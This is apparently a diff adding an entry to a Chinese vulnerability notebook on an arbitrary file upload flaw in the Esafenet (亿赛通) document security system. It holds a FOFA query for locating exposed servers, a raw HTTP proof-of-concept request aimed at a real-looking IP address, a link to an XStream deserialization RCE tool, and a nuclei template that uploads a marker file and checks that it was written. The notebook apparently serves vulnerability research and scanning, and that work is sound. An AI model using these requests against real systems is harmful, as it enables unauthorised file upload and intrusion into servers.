@@ -351,3 +351,83 @@ http:
 
 ---
 
+## 亿赛通-电子文档安全管理系统 UploadFileFromClientServiceForClient 文件上传
+
+#### fofa
+
+> app=亿赛通-电子文档安全管理系统
+
+#### poc
+
+```http
+POST /CDGServer3/UploadFileFromClientServiceForClient?AHECJIIACHMDAPKFAPLPFJPJHAHIDMFNKENDCLKLHFEKNDMAHGHOJBPEBEBCNIODHIKOBGFOMCPECDMKOHHIKOIPOPMMIOJDEACILAMPMLNLMELAMHAGGJMDLBCGCECCPKMMEIOKCBDGKHPDPFMLNPEKJHDEHNHFHILECBAJELDJNDBAEHOIIKDMHGOEHBIBHCAMDBBLHJGNCCPKDGLABEFHOKDPAKDCMIOHIFJAGCBPOMIKLMGBAGCNBGEGNKGABCOKEIJCMOMKEAKDALJEHMEIPHLLBJPCBKBDHCBAJIKKDKOHINENMDMKCHGKLJOJGDGIGF HTTP/1.1
+Host: 113.88.209.0:8090
+Content-Type: application/xml;charset=UTF-8
+
+vultest
+```
+
+#### 工具
+
+[https://github.com/0xf4n9x/CDGXStreamDeserRCE](https://github.com/0xf4n9x/CDGXStreamDeserRCE)
+
+路径使用工具加密
+
+![](img\1.png)
+
+参考：
+
+[亿赛通漏洞浅析](https://xz.aliyun.com/t/12950)
+
+[亿赛通电子文档安全管理系统XStream反序列化远程代码执行漏洞](https://0xf4n9x.github.io/cdg-xstream-deserialization-arbitrary-file-upload.html)
+
+#### nuclei
+
+```yaml
+id: Esafenet-UploadFileFromClientServiceForClient-file-upload
+# 模板的唯一标识，nuclei 扫描期间会输出该内容
+
+info:
+# 信息
+  name: Esafenet UploadFileFromClientServiceForClient 文件上传
+  # 漏洞名称
+  author: mewhz
+  # 作者
+  severity: low
+  # 严重程度
+  metadata:
+  # 元数据
+    max-request: 2
+  tags: Esafenet
+  # 标签，可以通过标签进行扫描
+
+http:
+# http 请求
+  - raw:
+    - |
+        POST /CDGServer3/UploadFileFromClientServiceForClient?AHECJIIACHMDAPKFAPLPFJPJHAHIDMFNKENDCLKLHFEKNDMAHGHOJBPEBEBCNIODHIKOBGFOMCPECDMKOHHIKOIPOPMMIOJDEACILAMPMLNLMELAMHAGGJMDLBCGCECCPKMMEIOKCBDGKHPDPFMLNPEKJHDEHNHFHILECBAJELDJNDBAEHOIIKDMHGOEHBIBHCAMDBBLHJGNCCPKDGLABEFHOKDPAKDCMIOHIFJAGCBPOMIKLMGBAGCNBGEGNKGABCOKEIJCMOMKEAKDALJEHMEIPHLLBJPCBKBDHCBAJIKKDKOHINENMDMKCHGKLJOJGDGIGF HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=c11993ce33b1f63072326e7f9ddb27a5
+
+        vultest
+    - |
+        GET /CDGServer3/66.txt HTTP/1.1
+        Host: {{Hostname}}
+
+    stop-at-first-match: true
+    # 命中第一个匹配就返回
+
+    matchers:
+    # 匹配规则
+      - type: dsl
+      # 表达式提取
+        dsl:
+          - "status_code_1 == 200"
+          # 第一个响应码 200
+          - "status_code_2 == 200 && contains((body_2), 'vultest')"
+          # 第二个响应码 200 并且第一个 body 中包含 vulntest 字符串
+        condition: and
+        # 所有匹配条件必须为 true
+```
+
+---
